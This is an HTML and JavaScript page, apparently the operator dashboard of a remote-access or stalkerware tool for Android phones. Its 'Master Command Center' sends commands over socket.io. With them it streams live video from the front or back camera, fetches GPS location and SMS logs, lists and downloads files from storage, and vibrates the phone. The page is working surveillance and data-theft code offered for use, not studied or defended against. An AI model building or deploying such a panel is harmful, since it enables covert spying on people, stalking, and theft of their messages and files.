<!DOCTYPE html>
<html>
<head>
    <title>Master Control Dashboard</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0f0f0f; color: #e0e0e0; padding: 20px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; }
        .card { background: #1a1a1a; padding: 20px; border-radius: 12px; border: 1px solid #333; }
        .video-box { background: #000; width: 100%; height: 300px; border-radius: 8px; border: 2px solid #444; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        #live-frame { width: 100%; height: 100%; object-fit: contain; }
        .btn-group { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
        button { padding: 8px 12px; border-radius: 6px; border: none; cursor: pointer; font-weight: bold; background: #0069d9; color: white; }
        .log-screen { background: #050505; color: #00ff00; padding: 12px; height: 200px; overflow-y: auto; font-family: monospace; border-radius: 6px; margin-top: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 13px; }
        th { background: #333; padding: 8px; text-align: left; }
        td { padding: 8px; border-bottom: 1px solid #222; }
    </style>
</head>
<body>
    <h2 style="text-align: center; color: #00d4ff;">Master Command Center</h2>
    <div class="grid">
        <div class="card" style="grid-column: span 2;">
            <h3>ğŸ¥ Live Stream</h3>
            <div class="video-box"><img id="live-frame" style="display:none;"><p id="placeholder">Stream Offline</p></div>
            <div class="btn-group">
                <select id="cam-idx"><option value="0">Back Cam</option><option value="1">Front Cam</option></select>
                <button onclick="startStream()">START</button>
                <button style="background:#c82333;" onclick="sendCmd('stop-stream')">STOP</button>
                <button onclick="sendCmd('vibrate')">Vibrate</button>
            </div>
        </div>
        <div class="card">
            <h3>ğŸ“Š Status</h3>
            <p>Battery: <span id="batt">--</span>%</p>
            <p id="loc">GPS: Not Updated</p>
            <button onclick="sendCmd('get-gps')">ğŸ“ GPS</button>
            <button onclick="sendCmd('get-sms')">ğŸ“© SMS</button>
        </div>
        <div class="card">
            <h3>ğŸ“ Files</h3>
            <button onclick="sendCmd('get-files')">Scan Storage</button>
            <div id="file-list" class="log-screen" style="height: 150px; color: white;"></div>
        </div>
        <div class="card" style="grid-column: span 2;">
            <h3>ğŸ“© SMS Logs</h3>
            <div class="log-screen" style="height: 250px;">
                <table>
                    <thead><tr><th>Sender</th><th>Message</th><th>Time</th></tr></thead>
                    <tbody id="sms-body"></tbody>
                </table>
            </div>
        </div>
    </div>
    <script>
        const socket = io();
        function sendCmd(c) { socket.emit('phone-execute', c); }
        function startStream() { sendCmd(`stream:${document.getElementById('cam-idx').value}:video`); }
        socket.on('data-stream', (b) => { 
            document.getElementById('placeholder').style.display = 'none';
            document.getElementById('live-frame').style.display = 'block';
            document.getElementById('live-frame').src = "data:image/jpeg;base64," + b; 
        });
        socket.on('battery-update', (v) => { document.getElementById('batt').innerText = v; });
        socket.on('sms-data', (d) => {
            const logs = JSON.parse(d);
            const tbody = document.getElementById('sms-body');
            tbody.innerHTML = logs.map(m => `<tr><td style="color:#00d4ff">${m.from}</td><td>${m.body}</td><td>${m.time}</td></tr>`).join('');
        });
        socket.on('file-data', (data) => {
            document.getElementById('file-list').innerHTML = JSON.parse(data).map(f => `<div>${f.d ? 'ğŸ“' : 'ğŸ“„'} ${f.n} <button onclick="sendCmd('download:${f.n}')">DL</button></div>`).join('');
        });
    </script>
</body>
</html>
